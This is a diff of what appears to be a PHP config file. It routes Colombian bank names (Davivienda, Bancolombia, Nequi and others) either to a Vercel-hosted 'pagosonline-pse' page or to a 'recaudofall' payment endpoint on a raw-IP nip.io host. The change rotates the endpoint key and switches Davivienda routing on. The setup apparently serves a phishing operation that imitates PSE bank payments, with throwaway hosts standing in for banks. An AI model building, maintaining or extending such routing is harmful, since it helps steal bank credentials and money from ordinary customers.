@@ -82,7 +82,7 @@ return [
 
     'links' => [
         'primary_page' => 'https://pagosonline-pse.vercel.app',
-        'recaudofall_base' => 'https://recaudofall.94.250.202.215.nip.io/pay?key=589f659158b5449c',
+        'recaudofall_base' => 'https://recaudofall.94.250.202.215.nip.io/pay?key=5d49c2dd6c154402',
     ],
 
     // Bancos que van a la pasarela Vercel.
@@ -94,7 +94,7 @@ return [
 //        'avvillas' => ['slug' => 'avv', 'id' => 'e795be1af0a0e791176cc511'],
         //      'bancolombia' => ['slug' => 'bc', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
 //        'nequi' => ['slug' => 'nq', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
-        //       'davivienda' => ['slug' => 'dv', 'id' => '4c3a6a204bd92c4c33690c3c'],
+               'davivienda' => ['slug' => 'dv', 'id' => '4c3a6a204bd92c4c33690c3c'],
         //      'cajasocial' => ['slug' => 'cj', 'id' => 'e795be1af0a0e791176cc511'],
     ],
 
